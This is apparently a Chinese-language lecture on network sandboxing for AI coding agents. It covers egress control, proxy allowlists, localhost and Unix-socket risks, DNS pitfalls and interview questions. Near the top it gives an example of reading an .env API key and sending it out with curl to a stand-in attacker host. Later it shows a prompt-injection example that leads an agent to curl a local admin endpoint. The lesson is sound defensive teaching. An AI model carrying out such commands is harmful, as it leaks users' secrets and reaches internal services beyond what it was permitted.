# 第 10 讲：Network Sandbox

## 1. 为什么文件隔离仍然不够

假设 Agent 能读取：

    .env
      ↓
    API_KEY

同时网络完全开放：

    curl https://attacker.example
      ↓
    数据外传

所以现代 AI Sandbox 必须同时考虑：

    Filesystem
    +
    Network

Anthropic 在 Claude Code Sandbox 的公开设计中也明确强调了这两个边界需要一起存在。

## 2. Network Sandbox 到底限制什么

至少包括：

1. 能不能联网；
2. 能访问哪些域名；
3. 能访问哪些 IP；
4. 能访问哪些端口；
5. 能不能访问 localhost；
6. 能不能访问私网；
7. 能不能访问 Unix socket。

## 3. 最简单：完全断网

Linux network namespace：

    Sandbox
      ↓
    private network namespace
      ↓
    no network

安全性高，但 Agent 无法：

    npm install
    pip install
    git clone
    download dependency

所以实际 Coding Agent 往往需要更细粒度策略。

## 4. Proxy 模式

更实用：

    Agent
      ↓
    Sandbox
      ↓
    Proxy
      ↓
    Allowlist
      ↓
    Internet

例如：

    ALLOW
      github.com
      registry.npmjs.org
      pypi.org

    DENY
      10.0.0.0/8
      172.16.0.0/12
      192.168.0.0/16
      localhost

## 5. 为什么 Proxy 很重要

如果 Agent 直接拥有网络：

    Agent
      ↓
    arbitrary socket
      ↓
    Internet

你很难统一审计。

如果经过 Proxy：

    Agent
      ↓
    Proxy
      ↓
    Policy
      ↓
    Destination

Proxy 可以：

- 记录域名；
- 限制域名；
- 限制端口；
- 控制认证；
- 做 credential injection；
- 记录 denied request。

## 6. localhost 为什么危险

很多开发机上：

    localhost:3000
    localhost:5432
    localhost:6379
    localhost:8080

可能存在：

- 本地 API；
- 数据库；
- Redis；
- 管理后台；
- IDE service。

如果 Agent 被 Prompt Injection 诱导：

    curl http://localhost:3000/admin

就可能触达本地服务。

所以：

> Internet Access 和 Local Network Access 应该分开建模。

## 7. SSRF 和 Agent

传统 SSRF：

    Web Server
       ↓
    attacker URL
       ↓
    internal service

Agent SSRF：

    Prompt Injection
       ↓
    Agent
       ↓
    curl / browser
       ↓
    internal service

所以 AI Sandbox 的 network policy 本质上也在解决一部分 Agent SSRF 风险。

## 8. Unix Socket

不要只关注 TCP。

例如：

    /var/run/docker.sock

如果 Agent 可以访问 Docker daemon：

    Agent
      ↓
    docker.sock
      ↓
    Docker daemon
      ↓
    high privilege control

所以：

> Unix socket 是本地 Sandbox 中经常被忽略的高价值边界。

## 9. DNS 也不是简单问题

域名策略还要考虑：

- DNS rebinding；
- IPv4 / IPv6；
- redirect；
- proxy bypass；
- direct socket；
- local resolver；
- private IP。

所以生产环境不能只写：

    allowedDomains = ["example.com"]

然后就认为全部完成。

## 10. 实验

只在自己控制的测试环境：

    curl https://example.com
    curl http://127.0.0.1:3000

观察：

> 为什么公网访问和 localhost 访问应该是两种不同的安全策略？

不要在没有授权的企业网络中进行端口扫描或内网探测。

## 11. 现代 Agent 的典型策略

    network:
      enabled: true
      allowed_domains:
        - github.com
        - pypi.org

      allow_local_network: false

      unix_sockets:
        - none

## 12. 面试题

### Q1：为什么 AI Sandbox 需要 Egress Control？

防止 Agent 把可读取的数据任意发送到外部。

### Q2：为什么 network namespace 不等于完整 Network Sandbox？

它可以隔离网络栈，但不能自然表达复杂的域名、端口和代理策略。

### Q3：为什么 docker.sock 风险很高？

它可能把 Agent 的权限边界直接连接到 Docker daemon，而 daemon 的控制能力远高于普通 workspace。
